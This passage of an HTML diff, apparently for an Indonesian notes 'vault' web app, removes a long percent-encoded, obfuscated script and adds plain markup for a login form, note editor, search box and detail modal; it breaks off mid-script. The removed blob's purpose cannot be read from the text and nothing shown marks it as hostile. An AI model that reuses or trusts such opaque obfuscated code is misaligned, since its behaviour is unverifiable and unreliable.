%34%34%30%23%3e%20%65%61%65%68%6b%73%77%70%6a%64%2b%66%71%6b%73%72%3f%22%73%6f%65%67%28%34%2f%30%2b%32%2c%35%2c%39%2d%3a%24%62%67%66%6d%63%70%71%75%2d%67%6d%6b%70%67%76%39%20%65%6e%77%77%2a%36%76%7f%2f%3d%24%79%2f%6c%6c%64%62%7a%3b%26%34%34%30%34%3e%20%64%6e%6b%6c%6c%2e%6d%73%63%6f%71%39%20%62%65%6e%71%65%73%3b%27%6e%77%71%77%6b%61%79%2f%60%73%6f%72%60%6a%74%3e%23%65%60%6c%74%62%70%3c%26%77%67%64%60%68%6e%6e%38%20%36%34%71%7e%3a%24%63%6a%68%6f%64%76%6b%74%6c%3b%26%61%67%64%63%48%6e%27%32%2e%30%77%21%61%64%71%67%39%23%71%71%65%72%63%6e%70%7f%28%7f%3a%24%60%77%73%73%3d%25%7d%0e%0c%27%24%20%24%23%20%27%22%2e%6a%73%65%65%6b%2a%75%6c%72%79%27%7f%20%61%69%74%76%6b%67%7b%3e%23%66%6b%65%78%38%22%7e%09%0d%24%20%24%23%20%27%22%20%2b%6d%70%62%64%68%2f%61%72%6e%73%65%6e%71%22%7c%26%65%67%65%69%6a%72%76%75%6e%61%38%21%70%64%76%28%2b%2c%62%6e%2d%65%66%70%65%2d%3a%24%62%67%66%6d%63%70%71%75%2d%67%6d%6b%70%67%76%39%20%65%6e%77%77%2a%33%36%77%7c%2b%39%23%62%76%70%64%62%70%2e%74%64%60%6b%73%76%3a%27%31%36%75%7a%3c%26%77%67%64%60%68%6e%6e%38%20%37%36%71%7e%3a%24%79%6f%67%74%6f%38%20%36%32%31%21%3a%24%6f%67%7b%2f%7e%69%64%71%6a%3b%26%3e%34%30%74%7b%3d%27%6d%63%7d%2d%69%61%6c%6d%68%70%39%20%3c%32%76%6d%3f%21%77%71%63%72%62%6f%71%7e%2d%7b%3f%22%62%71%73%75%3d%24%61%71%75%66%67%77%38%21%35%77%7c%20%71%72%6c%6c%66%20%73%61%73%2e%28%2b%69%68%60%75%72%29%3d%25%60%70%7e%28%71%68%67%67%71%7e%38%20%35%22%33%36%77%7c%20%30%33%70%7f%22%72%6c%60%62%2e%37%28%30%28%33%2c%37%2c%37%2e%3f%21%65%69%6f%6f%67%77%6b%76%6c%3a%25%6d%70%62%64%68%55%68%68%64%60%49%6e%25%32%2f%32%72%24%67%67%76%67%3a%22%70%74%77%6a%72%6c%75%6e%3e%23%72%60%6e%63%71%69%77%61%3a%24%7f%0b%09%20%27%22%20%25%22%21%26%29%6b%71%60%60%6c%28%67%71%6b%76%66%68%73%3e%3a%66%64%66%76%70%67%25%7f%21%63%76%6a%74%63%6d%74%3d%22%29%2c%3f%21%76%76%71%6b%70%68%71%69%38%20%66%60%74%77%6b%73%74%63%3e%20%73%73%70%3f%22%31%3b%27%68%67%62%77%3a%27%32%3d%25%70%6a%6f%6f%70%3a%24%33%3d%27%6a%67%6e%6b%69%72%3d%24%36%74%7b%3d%27%60%63%60%6f%68%74%76%73%6e%60%39%20%6b%69%6e%62%61%73%29%6e%76%63%60%68%67%69%76%28%3e%32%65%61%6e%28%20%72%60%72%2f%2d%2f%66%67%64%61%69%70%2b%28%23%25%3f%60%37%60%64%37%2d%3a%24%62%75%71%64%60%70%2f%77%61%65%6d%70%71%3a%24%30%36%77%7a%20%36%34%71%7e%27%34%20%34%3e%20%78%0d%0a%25%22%21%26%27%24%20%24%2d%6f%76%66%63%69%2d%69%61%64%60%67%76%23%7d%27%66%6b%70%72%6d%65%7c%3e%20%62%6f%67%7f%3f%20%6f%75%74%72%6c%62%7b%2b%66%71%69%76%67%6b%76%3b%26%72%74%63%61%64%2f%65%65%74%7c%65%66%68%3a%24%63%68%68%69%69%2d%6b%71%65%6e%73%3d%24%66%68%64%78%28%77%74%66%70%75%3b%27%6b%63%76%6a%6b%69%2d%62%74%76%75%77%68%3e%20%36%33%70%7f%3f%20%75%61%65%62%6c%6a%69%2b%61%71%73%76%71%6a%38%21%35%31%74%78%39%23%62%76%70%64%62%70%2e%64%76%70%74%75%6c%3a%27%31%70%7d%22%74%77%6b%6f%64%24%75%63%75%2a%2f%2a%60%70%74%63%63%72%2f%3e%20%78%0d%0a%25%22%21%26%27%24%20%24%2d%6f%76%66%63%69%2d%75%6d%73%68%67%24%7e%20%61%73%6e%71%2d%74%6d%7d%63%3a%24%30%2e%32%70%67%6a%3f%21%60%76%6a%74%2b%7a%67%6c%6b%68%71%38%21%3f%37%34%3d%24%66%71%6b%73%72%3f%22%77%65%75%2c%2f%2b%60%65%62%65%6e%71%29%3c%26%63%6f%75%74%6f%63%7c%38%20%63%6e%66%7e%3a%24%63%68%68%69%69%2d%6b%71%65%6e%73%3d%24%65%63%6d%74%60%70%3d%25%6b%62%76%3d%24%33%34%73%78%3a%22%6c%6e%6c%66%29%6f%63%6b%6d%6b%74%3d%22%33%2b%36%3c%26%7e%75%72%60%2c%62%75%65%63%68%38%21%64%75%63%63%69%2c%79%76%70%64%38%22%67%6a%60%7c%3a%24%30%3d%27%6d%63%77%6b%6a%68%28%76%6b%6d%6b%74%3d%22%33%35%72%79%3b%27%7b%0f%0e%23%20%27%22%20%25%22%21%28%62%68%71%71%64%2f%68%73%64%66%6e%21%7b%27%66%63%61%6e%69%75%73%77%6b%66%3b%26%69%75%6e%63%3e%20%65%73%72%61%65%73%3c%27%6a%71%6a%64%3d%27%67%71%69%73%73%3c%27%72%63%76%2b%2f%28%76%67%7d%76%2e%73%60%61%71%6a%67%63%75%79%2b%38%22%67%77%69%70%2f%71%68%7a%60%38%20%36%2c%39%74%60%6b%3d%24%66%77%75%77%71%77%38%21%76%76%6f%6e%70%64%72%3a%22%74%77%61%6f%73%6c%70%6b%75%6d%3a%27%67%71%69%73%73%26%37%2a%35%71%23%67%64%77%67%38%22%78%6d%63%70%68%3e%23%34%37%72%78%38%22%69%61%6c%6d%68%70%39%20%33%32%70%7d%3f%21%62%6c%71%70%68%60%7b%3d%22%66%69%65%79%3b%27%67%6c%6f%6a%6e%28%69%74%62%6d%74%3c%27%61%67%6a%77%67%75%3f%20%6f%75%74%72%6c%62%7b%2b%66%71%69%76%67%6b%76%3b%26%62%63%6e%70%64%72%3a%22%62%74%70%65%61%75%2b%72%67%67%6b%70%77%3a%25%35%31%21%3a%24%66%68%64%78%28%77%68%77%69%6f%6b%3d%24%30%39%23%7f%08%08%20%25%22%21%26%27%24%20%2a%66%6c%76%77%67%2a%6d%70%62%64%68%3a%6c%72%76%60%70%20%78%22%64%77%6b%75%72%3e%23%76%64%70%28%2a%2d%65%65%69%6d%67%76%28%3d%27%60%63%60%6f%68%74%76%73%6e%60%39%20%75%6b%62%66%2a%33%33%3c%28%36%3c%2f%36%3f%2e%30%2b%31%2a%3b%27%7b%0f%0e%23%20%27%22%20%25%22%21%28%68%75%64%67%6f%2f%65%73%64%7e%22%7c%26%68%67%72%6d%68%6e%28%60%71%71%76%70%69%3d%24%32%34%73%78%3a%22%7f%0a%08%21%26%27%24%20%24%23%20%29%6d%71%61%61%6d%29%64%61%74%6f%72%6e%72%22%7d%25%66%6a%73%77%68%63%7f%39%20%61%6e%67%7d%3f%21%60%6b%63%78%2b%67%6b%75%65%65%71%69%70%68%3d%24%65%75%6f%77%68%6c%3d%25%6b%62%76%3d%24%33%34%73%78%3a%22%6f%66%70%68%6d%69%2b%74%75%73%3a%27%30%34%75%7a%3c%26%77%67%64%60%68%6e%6e%2d%74%74%72%3b%26%34%32%70%7c%3e%20%65%73%72%61%65%73%29%73%75%70%3e%23%33%77%7a%20%70%73%6d%6d%63%24%76%67%71%28%28%2d%62%74%70%65%61%75%2f%3d%24%7c%0f%0d%0d%0a%25%22%21%26%27%24%20%24%32%2a%27%6e%71%66%66%6a%68%6e%24%26%24%64%6f%77%76%7b%25%28%30%09%0d%24%20%24%23%20%27%22%20%2b%6e%70%65%63%6f%6e%6d%2f%20%29%65%6f%75%76%7a%29%72%70%63%70%64%2c%27%2c%67%77%70%70%74%28%71%74%67%77%67%27%7f%20%71%65%79%72%28%67%6c%6f%6a%6e%3d%22%65%62%6c%75%61%75%39%20%74%60%64%63%69%6e%6c%38%21%32%37%74%78%24%30%36%77%7a%3d%25%6b%73%6d%63%2b%65%75%6f%77%68%6c%3a%25%31%21%37%27%2b%33%39%23%7f%08%08%20%25%22%21%26%27%24%20%2a%6f%71%64%66%6b%6b%6b%21%6d%27%79%20%62%72%6e%73%2d%75%6e%78%66%3c%27%36%2e%33%71%67%68%3f%20%60%73%6d%77%75%3e%20%72%60%72%2f%2d%2f%66%67%64%61%69%70%2b%39%23%6f%64%70%69%6e%6c%2e%64%76%70%74%75%6c%3a%27%31%36%75%7a%3c%26%64%6a%6b%6b%60%74%6c%73%6e%3f%22%71%71%6b%71%67%24%30%2e%30%77%20%6e%6c%67%6d%69%6f%74%63%3e%20%78%0d%0a%25%22%21%26%27%24%20%24%2d%67%68%72%74%7e%2d%74%72%64%70%67%24%68%2c%27%2c%67%77%70%70%74%28%71%74%67%77%67%27%69%20%78%22%67%77%69%70%2f%71%68%7a%60%38%20%30%70%66%69%3a%24%65%75%6f%71%75%38%20%73%61%73%2e%28%2b%74%63%7b%74%28%77%67%60%73%6f%62%64%76%7b%2f%3e%20%68%61%72%6c%69%6f%29%65%75%74%70%72%6f%3d%22%33%33%72%79%3b%27%75%70%67%66%6b%73%79%3a%25%32%2f%3f%3a%24%7f%0b%09%20%27%22%20%25%22%21%26%29%63%72%76%72%72%28%77%74%66%76%66%26%6c%24%7d%24%66%71%6b%73%72%3f%22%77%65%75%2c%2f%2b%67%63%69%6b%67%77%29%3c%26%78%0b%0a%0b%09%20%27%22%20%25%22%21%26%36%2e%20%68%72%69%76%75%74%25%28%30%09%0d%24%20%24%23%20%27%22%20%2b%6e%70%6f%76%73%74%2b%61%74%69%22%7d%25%72%70%73%6c%70%6b%75%6d%3a%27%64%6b%7d%65%65%3b%27%70%71%74%39%20%34%34%70%7d%3f%21%74%6c%6d%68%70%39%20%34%34%70%7d%3f%21%64%64%61%6d%6d%71%71%70%6c%64%3f%22%73%6f%65%67%28%36%36%3b%2b%34%38%29%34%39%2a%37%2a%32%2f%3e%20%65%73%72%61%65%73%3c%27%37%70%7c%23%75%76%6e%6b%61%22%77%65%75%2c%2f%2b%67%63%69%6b%67%77%29%3c%26%62%75%6c%75%71%3a%27%74%63%77%2a%2e%29%63%67%6e%6d%64%72%2c%3f%20%75%61%65%62%6c%6a%69%3e%23%33%37%72%78%25%31%37%76%7f%39%20%66%72%72%63%65%72%2a%70%62%62%6c%73%75%3e%23%38%77%7a%3d%25%67%76%74%72%75%72%3e%23%70%76%69%6e%71%65%73%3b%27%60%6b%71%73%6c%64%79%3a%25%64%6d%61%7f%39%20%67%6f%6b%6e%6c%2f%6e%76%66%69%72%3e%20%61%64%6e%73%65%72%38%22%68%65%77%3e%20%32%73%78%3a%22%66%74%6c%75%29%7e%63%6b%6d%6b%74%3d%22%36%35%32%3c%26%73%76%63%6a%76%6b%73%69%71%6b%38%21%65%6b%68%20%34%2d%35%72%22%67%66%77%66%3b%27%7e%2f%6f%6d%64%60%7a%3a%25%31%31%36%3a%24%66%75%6d%74%28%77%6b%7f%65%3b%26%37%2a%3b%76%64%6f%3a%22%6f%6e%6c%2e%6e%60%6f%69%6c%77%3a%27%36%34%75%7a%3c%26%65%67%65%69%67%72%76%72%2f%63%69%6d%72%60%76%3a%24%61%6c%70%70%28%36%32%71%7e%2c%39%20%7b%0c%0a%27%22%20%25%22%21%26%27%2a%6c%75%6a%71%70%76%2f%67%76%6f%3c%6f%75%76%63%71%20%7a%22%62%66%67%6c%6f%75%75%77%6a%67%3a%27%74%63%77%2a%2e%29%63%67%6e%6d%64%72%2c%3f%20%60%73%6d%77%75%3e%20%7d%6b%6b%73%65%3d%25%76%73%65%69%71%66%75%71%6f%3d%22%74%77%61%6f%73%6b%67%74%63%58%28%28%30%70%7d%29%3c%26%65%75%78%2b%76%68%64%66%71%7c%38%21%36%27%30%70%7c%23%33%35%72%78%25%70%68%64%64%2c%32%31%38%2c%31%3a%2c%33%3a%2d%36%29%31%2b%39%23%7f%08%08%0f%0f%22%21%26%27%24%20%24%23%31%2d%22%74%74%61%74%72%27%2e%31%0b%09%20%27%22%20%25%22%21%26%29%70%71%67%76%74%27%7f%20%75%73%74%6d%73%6f%71%6a%39%20%61%69%78%62%66%3c%26%65%75%74%70%72%6f%3d%22%33%33%72%79%3b%27%76%6b%6d%6b%74%3d%22%33%33%72%79%3b%27%68%67%62%77%3a%27%31%36%75%7a%3c%26%65%67%65%69%6a%72%76%75%6e%61%38%21%70%64%76%28%2b%2c%75%70%67%65%62%77%74%2d%3a%24%65%75%6f%71%75%38%20%7c%6a%6a%72%60%39%20%74%60%64%63%69%6e%6c%38%21%35%33%74%78%24%31%30%77%7a%3d%25%60%70%74%63%63%72%2b%71%63%63%69%77%70%38%21%35%37%74%78%39%23%64%6c%77%70%69%61%7a%3c%27%62%6c%63%7b%3d%27%61%6c%6e%6b%6f%29%6c%70%67%6b%76%3a%27%67%67%6b%76%66%74%3a%24%69%67%73%3a%27%31%30%75%7a%3c%26%65%75%78%2b%76%68%64%66%71%7c%38%21%36%27%33%70%7c%23%33%30%72%78%25%70%68%64%64%2c%30%28%33%2c%37%2e%30%2b%37%2a%3b%27%7e%2f%6f%6d%64%60%7a%3a%25%31%31%36%34%39%20%67%6d%6b%68%61%74%6e%73%6f%3c%27%71%6c%6f%67%67%50%72%20%35%2c%34%73%27%63%63%71%64%3d%27%6d%63%7d%2d%78%6d%63%70%68%3e%23%34%37%32%70%7d%3f%21%69%64%76%69%6f%6d%3a%27%32%20%66%75%75%77%3a%24%7f%0b%09%20%27%22%20%25%22%21%26%29%70%71%67%76%74%29%6a%6b%61%66%66%68%27%79%20%67%6d%6b%68%61%74%6e%73%6f%3c%27%71%6c%6f%67%67%43%73%79%6b%22%31%28%32%71%20%63%60%75%60%22%66%74%70%78%65%75%60%75%39%23%7f%08%08%20%25%22%21%26%27%24%20%2a%77%71%64%77%74%2b%65%73%74%76%76%20%79%23%62%64%67%6d%6c%70%70%71%69%60%3a%24%75%63%75%2a%2f%2a%66%62%68%6e%63%72%2f%3e%20%78%0d%0a%25%22%21%26%27%24%20%24%2d%74%76%61%75%71%2c%78%65%75%6a%6b%6a%6a%20%7a%22%62%66%67%6c%6f%75%75%77%6a%67%3a%27%74%63%77%2a%2e%29%7e%67%72%6a%68%6e%6e%29%3d%25%7d%0e%0c%27%24%20%24%23%20%27%22%2e%71%73%62%73%73%2a%6b%6a%65%71%27%7f%20%67%61%64%6b%6e%76%71%73%6d%64%3d%22%76%66%70%29%29%28%6f%6e%62%72%2b%3a%22%7f%0a%08%0e%0c%27%24%20%24%23%20%27%22%31%2f%22%62%68%6c%6b%63%71%68%20%2d%33%0f%0f%22%21%26%27%24%20%24%23%40%6a%65%7b%63%70%62%69%60%71%20%68%72%69%6c%6c%55%69%69%65%61%50%74%20%79%23%66%75%73%6f%25%7f%21%77%77%67%65%6f%77%7b%3d%32%3d%25%76%73%65%69%71%66%75%71%6f%3d%76%72%66%6c%74%6a%64%70%67%5f%2b%34%37%72%78%2e%22%74%63%64%68%67%2c%33%2e%3c%35%2b%38%22%7e%26%73%75%20%79%23%71%77%61%65%6e%76%7a%3c%34%39%20%70%71%63%69%77%66%74%70%6e%3c%73%76%63%6a%76%6c%64%76%67%5e%2a%31%2d%27%71%65%67%6f%67%2f%31%2b%38%22%7e%26%78%0b%0a%24%23%20%27%22%20%25%22%41%6b%60%7f%66%76%60%6f%60%77%20%63%61%65%61%4c%6a%20%79%23%66%75%73%6f%25%7f%21%77%77%67%65%6f%77%7b%3d%32%3d%25%7d%21%72%76%24%7d%24%72%70%64%67%6b%71%79%3b%35%3a%24%7f%24%7c%0f%0d%22%20%25%22%21%26%27%24%40%69%64%7b%61%70%63%6a%65%74%26%77%73%6c%71%64%20%7a%22%30%22%22%7c%26%73%76%63%6a%76%66%76%70%6f%3f%77%64%65%6b%63%28%37%28%3d%27%7d%20%32%32%26%26%7a%24%74%76%60%6e%72%64%71%77%6d%3b%73%62%67%6c%63%2b%33%29%32%37%2e%3f%21%79%27%37%30%34%24%20%7a%22%74%77%61%6f%73%61%75%72%6b%39%75%62%61%6c%62%2a%32%2d%3a%24%7f%24%7c%0f%0d%22%20%25%22%21%26%27%24%40%69%64%7b%61%70%63%6a%65%74%26%68%75%64%67%6f%55%6b%69%64%62%49%6f%26%7a%24%66%76%72%6f%27%7f%20%74%72%62%63%6c%70%7b%3e%33%3d%27%76%72%66%6c%74%60%76%76%6f%3e%77%72%64%6c%75%69%61%75%61%5c%2c%2f%30%33%70%7f%29%20%70%67%62%6a%60%2c%30%2a%38%37%2c%3f%20%7a%22%75%77%27%79%20%75%73%63%62%69%74%7e%38%32%3b%27%70%72%67%6d%75%61%73%72%6a%38%75%74%64%6a%75%68%60%74%60%59%28%35%29%21%73%62%67%6c%63%2b%33%2c%3f%20%7a%22%7e%09%0d%24%20%24%23%20%27%22%20%45%6f%66%7d%61%76%63%6b%64%75%27%77%6c%6e%66%66%51%77%24%7d%24%65%72%76%6d%20%78%22%70%76%64%61%6b%70%78%3a%37%3f%20%71%70%62%68%72%62%71%76%6c%3a%73%70%63%6b%77%6d%65%73%63%5b%2c%31%30%77%7a%2b%38%22%7e%26%73%75%20%79%23%71%77%61%65%6e%76%7a%3c%34%39%20%70%71%63%69%77%66%74%70%6e%3c%73%76%63%6a%76%6c%64%76%67%5e%2a%31%2d%3a%24%7f%24%7c%0f%0d%22%20%25%22%21%26%27%24%40%69%64%7b%61%70%63%6a%65%74%26%72%68%6b%60%64%44%76%7b%6e%25%7f%21%60%75%75%6f%24%7e%20%76%72%63%60%69%75%7d%3d%37%3d%24%77%72%64%6c%75%63%73%73%69%3d%70%72%67%6d%75%6b%61%74%62%59%29%36%2c%39%20%7b%23%74%76%22%7d%25%73%71%65%62%6f%74%7f%39%30%3a%22%74%77%61%6f%73%61%75%72%6b%39%74%75%61%6e%70%6e%62%72%60%5f%28%36%33%70%7f%29%3d%25%7d%21%79%08%0e%0f%0e%23%20%27%22%20%25%22%21%37%2d%24%75%61%71%71%6b%6e%20%2f%33%0e%0c%27%24%20%24%23%20%27%22%3a%3f%2d%78%61%65%69%6b%70%2c%75%62%70%71%69%6e%63%65%75%24%7d%24%7a%6b%63%76%68%3f%22%39%76%7f%39%20%7b%0c%0a%27%22%20%25%22%21%26%27%3e%3a%2b%7a%67%65%6f%6b%71%2d%74%63%75%75%6c%68%61%63%75%2d%74%77%61%64%6b%27%79%20%66%60%65%6a%6b%72%74%75%6f%62%3d%24%76%67%71%28%28%2d%62%6c%2d%74%61%62%75%6e%60%60%72%7c%29%3d%25%60%70%74%63%63%72%2b%71%63%63%69%77%70%38%21%32%77%7c%3d%24%7c%0f%0d%22%20%25%22%21%26%27%24%3a%3e%2c%79%60%60%6d%6e%76%2e%73%62%76%71%68%6f%62%64%70%2f%71%6a%76%69%65%24%7d%24%61%63%62%6f%69%77%73%76%68%63%3e%20%68%68%6e%60%61%72%2a%6b%73%65%63%6f%67%6a%77%28%73%73%20%67%73%75%72%76%6b%2c%24%75%63%75%2a%2f%2a%61%64%63%60%6a%74%2f%2f%20%22%3a%62%32%67%67%30%2c%39%20%66%72%72%63%65%72%2a%70%62%62%6c%73%75%3e%23%34%77%7a%3d%25%7d%0e%0c%08%0e%20%24%23%20%27%22%20%25%33%2b%26%75%63%75%74%72%6e%72%69%76%62%22%2b%37%08%0e%20%24%23%20%27%22%20%25%42%6e%61%63%6f%63%24%2b%6f%6c%6c%2f%7c%69%65%72%6f%3e%20%32%33%30%77%7a%2b%25%7f%21%28%72%70%63%70%76%2f%62%73%6e%71%61%6a%68%60%76%20%79%23%69%75%69%64%2a%76%66%69%77%68%63%70%64%2f%62%73%6c%72%6d%6f%73%3d%24%72%63%73%67%64%76%28%37%2e%32%60%75%2f%3d%24%7c%20%29%64%71%77%6d%2e%65%62%70%6b%75%6d%75%27%7f%20%63%6e%66%7e%28%60%6b%76%64%65%73%69%71%6b%38%21%74%76%7d%3d%24%7c%20%22%6c%71%71%65%74%4a%6c%71%74%24%7e%20%6e%70%6b%61%2d%75%61%68%74%6c%67%77%67%28%67%71%69%75%6e%68%72%3e%20%76%64%70%60%61%74%2d%30%2d%35%61%76%2b%39%23%7f%27%7d%0f%0f%22%21%26%27%24%20%24%23%40%68%65%64%6e%61%21%2e%68%6f%6e%2b%7a%6b%63%76%68%3f%22%38%30%3f%74%78%2f%23%7d%27%2c%75%71%61%75%73%28%61%71%6a%77%63%6c%6c%67%77%22%7c%26%6e%76%6b%60%2c%74%60%6d%70%69%61%75%61%28%61%71%68%74%6f%69%77%3a%25%70%66%76%60%67%74%2c%36%2c%34%64%72%2e%3f%21%79%27%7b%0f%0e%23%20%27%22%20%25%22%21%46%68%63%64%6f%60%20%2f%6d%6b%6b%2d%78%6d%63%70%68%3e%23%33%37%30%34%75%7a%2a%26%7a%24%25%6a%72%74%60%77%4c%6e%77%75%26%7a%24%69%76%68%64%28%76%67%6a%72%6d%65%73%63%2f%61%72%6c%70%6d%6e%70%38%21%74%60%74%67%67%77%28%32%2e%33%63%70%2a%3b%27%7b%20%7b%0c%0a%08%08%20%25%22%21%26%27%24%20%35%29%20%73%61%6f%67%61%69%65%69%24%69%67%6c%62%64%70%20%2f%33%0e%0c%27%24%20%24%23%20%27%22%2e%6b%73%75%61%28%6f%6f%67%6a%67%28%76%68%72%6d%63%26%7a%24%6f%67%71%69%6c%6c%3a%25%31%31%76%7f%24%30%24%30%30%77%7a%20%36%32%71%7e%3a%24%6f%67%7b%2f%7e%69%64%71%6a%3b%26%34%34%30%23%3e%20%65%73%72%61%65%73%29%75%67%64%6f%74%75%3d%22%36%75%7a%3c%26%68%67%78%2b%6b%67%6c%6b%68%71%38%21%35%37%34%70%7c%3e%20%76%60%6a%62%67%75%29%61%6f%74%3e%23%65%76%74%67%77%3f%21%64%76%76%64%63%71%3a%27%31%70%7d%22%74%77%6b%6f%64%24%75%63%75%2a%2f%2a%60%70%74%63%63%72%2f%3e%20%78%0d%0a%25%22%21%26%27%24%20%24%2d%6f%76%66%63%69%2d%6a%69%64%6d%67%2b%6f%63%75%6b%67%25%7f%21%69%64%7c%2f%7d%68%64%73%6a%3a%25%31%31%36%20%39%20%6b%60%78%28%6a%67%6e%6b%69%72%3d%24%35%34%33%70%7f%3f%20%67%73%73%62%60%76%2f%76%60%64%6c%75%75%3f%22%39%76%7f%39%20%6b%60%72%6e%69%6e%2a%76%70%76%3d%24%33%34%73%78%3a%22%62%74%70%65%61%75%3e%20%37%73%78%27%77%71%69%69%65%26%71%67%72%2c%2c%2f8509693%36%33%31%34%33%30%37' + unescape('%27%29%29%3b'));
-// -->
-</script>
-<noscript><i>Javascript required</i></noscript>
+    <!-- LOGIN -->
+    <div class="login-container" id="loginContainer">
+        <div class="login-box">
+            <div class="login-header">
+                <div class="login-logo pulse-animation"><i class="fas fa-coins"></i></div>
+                <h1 class="login-title">Vault Data Penting</h1>
+                <p class="login-subtitle">Acces Privacy </p>
+            </div>
+            <form class="login-form" id="loginForm">
+                <div class="form-group">
+                    <label for="username" class="form-label"><i class="fas fa-user"></i> Username</label>
+                    <input type="text" id="username" class="form-input" placeholder="Masukkan username" required autocomplete="username">
+                </div>
+                <div class="form-group">
+                    <label for="password" class="form-label"><i class="fas fa-lock"></i> Password</label>
+                    <input type="password" id="password" class="form-input" placeholder="Masukkan password" required autocomplete="current-password">
+                    <button type="button" class="password-toggle" id="togglePassword"><i class="fas fa-eye"></i></button>
+                </div>
+                <button type="submit" class="login-btn"><i class="fas fa-unlock-alt"></i> Masuk ke Vault</button>
+                <div class="login-footer"><p><i class="fas fa-shield-alt"></i> PoWered by Stev</p></div>
+            </form>
+        </div>
+    </div>
 
+    <!-- MAIN APP -->
+    <div class="main-app" id="mainApp">
+        <button class="logout-btn" id="logoutBtn"><i class="fas fa-sign-out-alt"></i> Logout</button>
+        <div class="container">
+            <header><h1><i class="fas fa-vault"></i> Vault DATA PENTING</h1></header>
+
+            <!-- stats -->
+            <section class="stats-container">
+                <div class="stat-card"><div class="stat-icon"><i class="fas fa-users"></i></div><div class="stat-value" id="activeUsers">1</div><div class="stat-label">Pengguna Aktif</div></div>
+                <div class="stat-card"><div class="stat-icon"><i class="fas fa-eye"></i></div><div class="stat-value" id="totalVisits">1</div><div class="stat-label">Total Kunjungan</div></div>
+                <div class="stat-card"><div class="stat-icon"><i class="fas fa-sticky-note"></i></div><div class="stat-value" id="totalNotes">0</div><div class="stat-label">Total Catatan</div></div>
+            </section>
+
+            <!-- form catatan + GAMBAR -->
+            <section class="form-container">
+                <div class="form-title"><i class="fas fa-plus-circle" id="formIcon"></i><h2 id="formTitle">Tambah Catatan Baru</h2></div>
+                <input type="hidden" id="editingNoteId">
+                
+                <div class="form-group">
+                    <label for="noteTitle"><i class="fas fa-heading"></i> Judul Catatan</label>
+                    <input type="text" id="noteTitle" placeholder="Masukkan judul catatan...">
+                    <div class="char-count"><span id="titleCharCount">0</span> karakter</div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="noteContent"><i class="fas fa-sticky-note"></i> Isi Catatan (teks/kode)</label>
+                    <textarea id="noteContent" placeholder="Tulis catatan, kode, atau link penting..."></textarea>
+                    <div class="char-count"><span id="contentCharCount">0</span> karakter</div>
+                </div>
+
+                <!-- BAGIAN GAMBAR -->
+                <div class="form-group">
+                    <label for="noteImage"><i class="fas fa-image"></i> Gambar (opsional, maks 5MB)</label>
+                    <input type="file" id="noteImage" accept="image/*">
+                    <div id="imagePreviewContainer">
+                        <img id="imagePreview" src="#" alt="Preview">
+                        <button type="button" id="removeImageBtn" class="btn btn-danger"><i class="fas fa-times"></i> Hapus</button>
+                    </div>
+                </div>
+
+                <div class="form-actions">
+                    <button id="saveBtn" class="btn btn-primary"><i class="fas fa-save"></i> Simpan</button>
+                    <button id="cancelEditBtn" class="btn btn-danger" style="display: none;"><i class="fas fa-times"></i> Batal</button>
+                    <button id="clearFormBtn" class="btn"><i class="fas fa-broom"></i> Bersihkan</button>
+                </div>
+            </section>
+
+            <!-- Daftar catatan + SEARCH -->
+            <section>
+                <div class="notes-header">
+                    <h2><i class="fas fa-clipboard-list"></i> Catatan Tersimpan</h2>
+                    <div class="search-wrapper">
+                        <input type="text" id="searchInput" placeholder="Cari catatan..." class="search-input">
+                        <i class="fas fa-search search-icon"></i>
+                    </div>
+                    <div class="notes-count" id="notesCount">0 catatan</div>
+                </div>
+                <div id="notesList"><div class="loading"><i class="fas fa-spinner fa-spin"></i><p>Memuat catatan dari database...</p></div></div>
+            </section>
+        </div>
+
+        <!-- MODAL LIHAT DETAIL + GAMBAR -->
+        <div id="viewNoteModal" class="modal">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h3 class="modal-title"><i class="fas fa-file-alt"></i> <span id="modalNoteTitle"></span></h3>
+                    <button class="close-modal" id="closeModalBtn">&times;</button>
+                </div>
+                <div class="modal-body">
+                    <div class="form-group">
+                        <label><i class="fas fa-sticky-note"></i> Isi Catatan</label>
+                        <div id="modalNoteContent" style="background: rgba(15,23,42,0.6); border:1px solid var(--border); border-radius:10px; padding:16px; max-height:200px; overflow-y:auto; white-space:pre-wrap; word-break:break-word; font-family:monospace; line-height:1.6;"></div>
+                    </div>
+                    <!-- GAMBAR DI MODAL -->
+                    <div id="modalImageContainer" style="margin-top:20px; display:none;">
+                        <label><i class="fas fa-image"></i> Gambar</label>
+                        <img id="modalImage" src="#" alt="Gambar Catatan" class="modal-image-large">
+                    </div>
+                    <div class="form-group">
+                        <label><i class="far fa-calendar"></i> Informasi</label>
+                        <div style="display:grid; grid-template-columns:1fr; gap:12px;">
+                            <div style="background:rgba(15,23,42,0.6); border:1px solid var(--border); border-radius:10px; padding:12px;">
+                                <div style="font-size:0.8rem; color:var(--text-secondary); margin-bottom:6px;"><i class="fas fa-calendar-plus"></i> Dibuat</div>
+                                <div id="modalCreatedAt" style="font-weight:600; font-size:0.9rem;"></div>
+                            </div>
+                            <div style="background:rgba(15,23,42,0.6); border:1px solid var(--border); border-radius:10px; padding:12px;">
+                                <div style="font-size:0.8rem; color:var(--text-secondary); margin-bottom:6px;"><i class="fas fa-calendar-check"></i> Diubah</div>
+                                <div id="modalUpdatedAt" style="font-weight:600; font-size:0.9rem;"></div>
+                            </div>
+                            <div style="background:rgba(15,23,42,0.6); border:1px solid var(--border); border-radius:10px; padding:12px;">
+                                <div style="font-size:0.8rem; color:var(--text-secondary); margin-bottom:6px;"><i class="fas fa-id-card"></i> ID</div>
+                                <div id="modalNoteId" style="font-weight:600; font-size:0.85rem; word-break:break-all;"></div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="modal-actions">
+                    <button id="editFromModalBtn" class="btn btn-warning"><i class="fas fa-edit"></i> Edit</button>
+                    <button id="copyModalBtn" class="btn btn-success"><i class="far fa-copy"></i> Salin Teks</button>
+                    <button id="closeModalBtn2" class="btn"><i class="fas fa-times"></i> Tutup</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="toast" class="toast hidden"><i class="fas fa-check-circle"></i><span id="toastMessage">Berhasil</span></div>
+
+    <script type="module">
+        function generateCryptoParticles() {
+            const container = document.getElementById('cryptoBackground');
+            const particleCount = window.innerWidth < 768 ? 15 : 25;
+            while (container.children.length > 1) container.removeChild(container.lastChild);
+            for (let i = 0; i < particleCount; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'crypto-particle';
+                const size = (window.innerWidth < 768 ? 15 : 25) + Math.random() * 15;
+                particle.style.left = `${Math.random() * 100}%`;
